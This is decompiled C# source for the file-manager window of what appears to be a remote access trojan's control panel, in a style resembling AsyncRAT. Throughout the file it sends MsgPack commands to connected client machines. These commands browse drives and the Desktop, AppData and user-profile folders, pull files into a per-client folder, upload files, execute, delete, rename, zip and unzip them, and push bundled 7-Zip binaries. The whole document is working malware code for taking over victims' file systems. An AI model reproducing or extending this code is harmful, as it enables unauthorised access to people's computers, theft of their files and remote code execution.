﻿using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Server.Connection;
using Server.MessagePack;
using Server.Properties;

namespace Server.Forms
{
	// Token: 0x02000093 RID: 147
	public partial class FormFileManager : Form
	{
		// Token: 0x170000CC RID: 204
		// (get) Token: 0x06000465 RID: 1125 RVA: 0x0000450F File Offset: 0x0000270F
		// (set) Token: 0x06000466 RID: 1126 RVA: 0x00004517 File Offset: 0x00002717
		public Form1 F { get; set; }

		// Token: 0x170000CD RID: 205
		// (get) Token: 0x06000467 RID: 1127 RVA: 0x00004520 File Offset: 0x00002720
		// (set) Token: 0x06000468 RID: 1128 RVA: 0x00004528 File Offset: 0x00002728
		internal Clients Client { get; set; }

		// Token: 0x170000CE RID: 206
		// (get) Token: 0x06000469 RID: 1129 RVA: 0x00004531 File Offset: 0x00002731
		// (set) Token: 0x0600046A RID: 1130 RVA: 0x00004539 File Offset: 0x00002739
		public string FullPath { get; set; }

		// Token: 0x0600046B RID: 1131 RVA: 0x00004542 File Offset: 0x00002742
		public FormFileManager()
		{
			this.InitializeComponent();
		}

		// Token: 0x0600046C RID: 1132 RVA: 0x0002BB60 File Offset: 0x00029D60
		private void listView1_DoubleClick(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count == 1)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "getPath";
					msgPack.ForcePathObject("Path").AsString = this.listView1.SelectedItems[0].ToolTipText;
					this.listView1.Enabled = false;
					this.toolStripStatusLabel3.ForeColor = Color.Green;
					this.toolStripStatusLabel3.Text = "Please Wait";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600046D RID: 1133 RVA: 0x0002BC38 File Offset: 0x00029E38
		private void backToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				string text = this.toolStripStatusLabel1.Text;
				if (text.Length <= 3)
				{
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "getDrivers";
					this.toolStripStatusLabel1.Text = "";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
				else
				{
					text = text.Remove(text.LastIndexOfAny(new char[]
					{
						'\\'
					}, text.LastIndexOf('\\')));
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "getPath";
					msgPack.ForcePathObject("Path").AsString = text + "\\";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "fileManager";
				msgPack2.ForcePathObject("Command").AsString = "getDrivers";
				this.toolStripStatusLabel1.Text = "";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
			}
		}

		// Token: 0x0600046E RID: 1134 RVA: 0x0002BDB0 File Offset: 0x00029FB0
		private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					if (!Directory.Exists(Path.Combine(Application.StartupPath, "ClientsFolder\\" + this.Client.ID)))
					{
						Directory.CreateDirectory(Path.Combine(Application.StartupPath, "ClientsFolder\\" + this.Client.ID));
					}
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						if (listViewItem.ImageIndex == 0 && listViewItem.ImageIndex == 1 && listViewItem.ImageIndex == 2)
						{
							break;
						}
						MsgPack msgPack = new MsgPack();
						string dwid = Guid.NewGuid().ToString();
						msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
						msgPack.ForcePathObject("Command").AsString = "socketDownload";
						msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText;
						msgPack.ForcePathObject("DWID").AsString = dwid;
						ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
						base.BeginInvoke(new MethodInvoker(delegate()
						{
							if ((FormDownloadFile)Application.OpenForms["socketDownload:" + dwid] == null)
							{
								new FormDownloadFile
								{
									Name = "socketDownload:" + dwid,
									Text = "socketDownload:" + this.Client.ID,
									F = this.F,
									DirPath = this.FullPath
								}.Show();
							}
						}));
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600046F RID: 1135 RVA: 0x0002BF6C File Offset: 0x0002A16C
		private void uPLOADToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.toolStripStatusLabel1.Text.Length >= 3)
			{
				try
				{
					OpenFileDialog openFileDialog = new OpenFileDialog();
					openFileDialog.Multiselect = true;
					if (openFileDialog.ShowDialog() == DialogResult.OK)
					{
						foreach (string text in openFileDialog.FileNames)
						{
							if ((FormDownloadFile)Application.OpenForms["socketDownload:"] == null)
							{
								FormDownloadFile formDownloadFile = new FormDownloadFile
								{
									Name = "socketUpload:" + Guid.NewGuid().ToString(),
									Text = "socketUpload:" + this.Client.ID,
									F = Program.form1,
									Client = this.Client
								};
								formDownloadFile.FileSize = new FileInfo(text).Length;
								formDownloadFile.labelfile.Text = Path.GetFileName(text);
								formDownloadFile.FullFileName = text;
								formDownloadFile.label1.Text = "Upload:";
								formDownloadFile.ClientFullFileName = this.toolStripStatusLabel1.Text + "\\" + Path.GetFileName(text);
								MsgPack msgPack = new MsgPack();
								msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
								msgPack.ForcePathObject("Command").AsString = "reqUploadFile";
								msgPack.ForcePathObject("ID").AsString = formDownloadFile.Name;
								formDownloadFile.Show();
								ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
							}
						}
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000470 RID: 1136 RVA: 0x0002C134 File Offset: 0x0002A334
		private void dELETEToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						if (listViewItem.ImageIndex != 0 && listViewItem.ImageIndex != 1 && listViewItem.ImageIndex != 2)
						{
							MsgPack msgPack = new MsgPack();
							msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
							msgPack.ForcePathObject("Command").AsString = "deleteFile";
							msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText;
							ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
						}
						else if (listViewItem.ImageIndex == 0)
						{
							MsgPack msgPack2 = new MsgPack();
							msgPack2.ForcePathObject("Pac_ket").AsString = "fileManager";
							msgPack2.ForcePathObject("Command").AsString = "deleteFolder";
							msgPack2.ForcePathObject("Folder").AsString = listViewItem.ToolTipText;
							ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000471 RID: 1137 RVA: 0x0002C2C0 File Offset: 0x0002A4C0
		private void rEFRESHToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.toolStripStatusLabel1.Text != "")
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "getPath";
					msgPack.ForcePathObject("Path").AsString = this.toolStripStatusLabel1.Text;
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
				else
				{
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack2.ForcePathObject("Command").AsString = "getDrivers";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000472 RID: 1138 RVA: 0x0002C3B0 File Offset: 0x0002A5B0
		private void eXECUTEToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
						msgPack.ForcePathObject("Command").AsString = "execute";
						msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText;
						ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000473 RID: 1139 RVA: 0x0002C494 File Offset: 0x0002A694
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}

		// Token: 0x06000474 RID: 1140 RVA: 0x0002C4D4 File Offset: 0x0002A6D4
		private void DESKTOPToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "DESKTOP";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x06000475 RID: 1141 RVA: 0x0002C558 File Offset: 0x0002A758
		private void APPDATAToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "APPDATA";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x06000476 RID: 1142 RVA: 0x0002C5DC File Offset: 0x0002A7DC
		private void CreateFolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("Create Folder", "Name", Path.GetRandomFileName().Replace(".", ""), -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "createFolder";
					msgPack.ForcePathObject("Folder").AsString = Path.Combine(this.toolStripStatusLabel1.Text, text);
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000477 RID: 1143 RVA: 0x0002C69C File Offset: 0x0002A89C
		private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					StringBuilder stringBuilder = new StringBuilder();
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						stringBuilder.Append(listViewItem.ToolTipText + "-=>");
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "copyFile";
					msgPack.ForcePathObject("File").AsString = stringBuilder.ToString();
					msgPack.ForcePathObject("IO").AsString = "copy";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000478 RID: 1144 RVA: 0x0002C7B4 File Offset: 0x0002A9B4
		private void PasteToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "pasteFile";
				msgPack.ForcePathObject("File").AsString = this.toolStripStatusLabel1.Text;
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x06000479 RID: 1145 RVA: 0x0002C840 File Offset: 0x0002AA40
		private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count == 1)
			{
				try
				{
					string text = Interaction.InputBox("Rename File or Folder", "Name", this.listView1.SelectedItems[0].Text, -1, -1);
					if (!string.IsNullOrEmpty(text))
					{
						if (this.listView1.SelectedItems[0].ImageIndex != 0 && this.listView1.SelectedItems[0].ImageIndex != 1 && this.listView1.SelectedItems[0].ImageIndex != 2)
						{
							MsgPack msgPack = new MsgPack();
							msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
							msgPack.ForcePathObject("Command").AsString = "renameFile";
							msgPack.ForcePathObject("File").AsString = this.listView1.SelectedItems[0].ToolTipText;
							msgPack.ForcePathObject("NewName").AsString = Path.Combine(this.toolStripStatusLabel1.Text, text);
							ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
						}
						else if (this.listView1.SelectedItems[0].ImageIndex == 0)
						{
							MsgPack msgPack2 = new MsgPack();
							msgPack2.ForcePathObject("Pac_ket").AsString = "fileManager";
							msgPack2.ForcePathObject("Command").AsString = "renameFolder";
							msgPack2.ForcePathObject("Folder").AsString = this.listView1.SelectedItems[0].ToolTipText + "\\";
							msgPack2.ForcePathObject("NewName").AsString = Path.Combine(this.toolStripStatusLabel1.Text, text);
							ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
						}
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600047A RID: 1146 RVA: 0x0002CA60 File Offset: 0x0002AC60
		private void UserProfileToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "USER";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x0600047B RID: 1147 RVA: 0x0002CAE4 File Offset: 0x0002ACE4
		private void DriversListsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
			msgPack.ForcePathObject("Command").AsString = "getDrivers";
			this.toolStripStatusLabel1.Text = "";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x0600047C RID: 1148 RVA: 0x0002CB50 File Offset: 0x0002AD50
		private void OpenClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (!Directory.Exists(this.FullPath))
				{
					Directory.CreateDirectory(this.FullPath);
				}
				Process.Start(this.FullPath);
			}
			catch
			{
			}
		}

		// Token: 0x0600047D RID: 1149 RVA: 0x00004550 File Offset: 0x00002750
		private void FormFileManager_FormClosed(object sender, FormClosedEventArgs e)
		{
			ThreadPool.QueueUserWorkItem(delegate(object o)
			{
				Clients client = this.Client;
				if (client == null)
				{
					return;
				}
				client.Disconnected();
			});
		}

		// Token: 0x0600047E RID: 1150 RVA: 0x0002CB98 File Offset: 0x0002AD98
		private void CutToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					StringBuilder stringBuilder = new StringBuilder();
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						stringBuilder.Append(listViewItem.ToolTipText + "-=>");
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "copyFile";
					msgPack.ForcePathObject("File").AsString = stringBuilder.ToString();
					msgPack.ForcePathObject("IO").AsString = "cut";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600047F RID: 1151 RVA: 0x0002CCB0 File Offset: 0x0002AEB0
		private void ZipToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					StringBuilder stringBuilder = new StringBuilder();
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						stringBuilder.Append(listViewItem.ToolTipText + "-=>");
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "zip";
					msgPack.ForcePathObject("Path").AsString = stringBuilder.ToString();
					msgPack.ForcePathObject("Zip").AsString = "true";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000480 RID: 1152 RVA: 0x0002CDC8 File Offset: 0x0002AFC8
		private void UnzipToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
						msgPack.ForcePathObject("Command").AsString = "zip";
						msgPack.ForcePathObject("Path").AsString = listViewItem.ToolTipText;
						msgPack.ForcePathObject("Zip").AsString = "false";
						ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000481 RID: 1153 RVA: 0x0002CEC4 File Offset: 0x0002B0C4
		private void InstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
			msgPack.ForcePathObject("Command").AsString = "installZip";
			msgPack.ForcePathObject("exe").SetAsBytes(Resources._7z);
			msgPack.ForcePathObject("dll").SetAsBytes(Resources._7z1);
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}
	}
}
